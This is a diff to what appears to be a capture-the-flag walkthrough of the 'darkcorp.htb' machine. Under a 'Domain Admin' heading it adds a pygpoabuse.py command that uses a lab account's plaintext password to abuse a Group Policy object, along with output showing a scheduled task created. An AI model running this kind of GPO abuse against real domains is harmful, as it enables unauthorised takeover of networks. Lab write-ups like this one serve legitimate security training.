@@ -1359,6 +1359,13 @@ This user is part of remote management users
 # Domain Admin
 
 ```python
+python3 pygpoabuse.py 'darkcorp.htb'/'taylor.b.adm':'!QAZzaq1' -gpo-id '652CAE9A-4BB7-49F2-9E52-3361F33CE786' -f
+[+] ScheduledTask TASK_f7202c64 created!
+```
+
+Ill set the schedules task
+
+```python
 
 ```
 
